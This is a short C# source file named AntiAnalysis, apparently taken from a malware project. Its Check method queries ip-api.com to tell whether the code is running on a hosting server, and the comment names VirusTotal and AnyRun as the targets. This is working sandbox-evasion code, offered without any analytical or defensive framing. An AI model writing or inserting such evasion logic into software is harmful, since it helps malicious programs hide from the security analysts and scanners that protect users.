namespace AntiAnalysis
{
    internal sealed class Hosting
    {
        /// <summary>
        /// Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
        /// </summary>
        public static bool Check()
        {
            try
            {
                string status = new System.Net.WebClient()
                    .DownloadString("http://ip-api.com/line/?fields=hosting");
                return status.Contains("true");
            }
            catch { }
            return false;
        }
    }
}
